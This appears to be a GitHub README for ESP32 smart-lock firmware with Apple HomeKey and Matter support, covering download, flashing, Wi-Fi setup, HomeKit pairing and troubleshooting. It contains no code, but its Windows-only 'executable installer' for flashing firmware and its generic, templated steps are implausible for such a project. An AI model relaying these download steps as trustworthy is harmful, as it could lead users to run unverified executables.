# 🔒 Matter-Lock-with-HomeKey-ESP32 - Secure smart locks made simple today

[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/franklinjmm2002/Matter-Lock-with-HomeKey-ESP32/releases)

This project provides software for an ESP32 smart lock. It connects your lock to Apple HomeKit using NFC technology. The system supports Matter, which allows your lock to talk to different smart home platforms over Wi-Fi or Thread.

## 📋 System Requirements

To install and manage your smart lock, your computer must meet these basic needs:

*   Operating System: Windows 10 or Windows 11.
*   Connection: A USB-C or Micro-USB cable to connect your ESP32 board to your computer.
*   Network: A stable Wi-Fi connection for the initial setup of your smart home devices.
*   Browsers: Google Chrome, Microsoft Edge, or Firefox.

## 📥 Get the Software

You need to obtain the latest firmware files to install the application on your hardware. Follow these instructions to acquire what you need:

1.  Visit the [official releases page](https://github.com/franklinjmm2002/Matter-Lock-with-HomeKey-ESP32/releases).
2.  Look for the section marked Latest.
3.  Click the zip file or the executable installer listed under Assets.
4.  Save the file to your desktop for quick access.

## ⚙️ Setting Up Your Hardware

The smart lock relies on the ESP32 chip. This chip acts as the brain for your door lock.

1.  Plug your ESP32 board into your computer using the USB cable. 
2.  Windows will search for the correct drivers. If the device does not show up, download the CP210x USB to UART Bridge VCP drivers from the manufacturer website.
3.  Keep the board connected throughout the entire process.

## 🖥️ Installing the Firmware

Follow these steps to put the software onto your ESP32 device:

1.  Open the folder where you saved the download.
2.  Double-click the installer file.
3.  Follow the instructions on your screen.
4.  Select the COM port that matches your ESP32 device. You can find this in your Windows Device Manager under Ports.
5.  Press the Install button.
6.  Wait for the progress bar to finish.
7.  Unplug the device once the screen says Success.

## 🏠 Connecting to Your Smart Home

Once the code lives on the ESP32, you need to connect it to your home network:

1.  Plug the ESP32 back into a wall power adapter or the lock housing.
2.  Use your phone to search for new Wi-Fi networks.
3.  Select the network named Matter-Lock-Setup.
4.  Your phone will open a web page.
5.  Type your home Wi-Fi name and password into the boxes.
6.  The device will restart and join your home network.

## 🔑 Using Apple HomeKey

This lock supports Apple HomeKey. You can tap your iPhone or Apple Watch against the lock to open the door.

1.  Open the Apple Home app on your iPhone.
2.  Tap the Plus icon and select Add Accessory.
3.  Scan the QR code provided with your lock hardware.
4.  The app will prompt you to add the lock to your home.
5.  Follow the steps in the Home app to enable HomeKey.
6.  Your lock will appear in your Apple Wallet.

## 🛠️ Configuring Settings

You can change how your lock behaves through the internal web interface:

1.  Find the IP address of your lock in your router settings.
2.  Type that address into your web browser.
3.  You will see a dashboard with your lock settings.
4.  Enable Auto-Relock to have the door lock itself after a set time.
5.  Adjust the NFC sensitivity if you find that the lock does not detect your phone right away.
6.  Save your changes. The lock will update its behavior immediately.

## 💡 Troubleshooting Common Issues

If the lock stops responding, check these points:

*   Power: Ensure the power supply provides enough voltage. A weak power supply causes the ESP32 to restart.
*   Cables: USB cables sometimes break. Try a different cable if the computer does not see your board.
*   Wi-Fi: Keep the lock within range of your router. Thick walls reduce signal strength.
*   Reset: Press the small button on the side of the ESP32 board to perform a hard reset. This clears temporary errors.
*   Firmware: If issues continue, return to the download link and ensure you use the newest version of the software. Updates fix bugs and improve performance.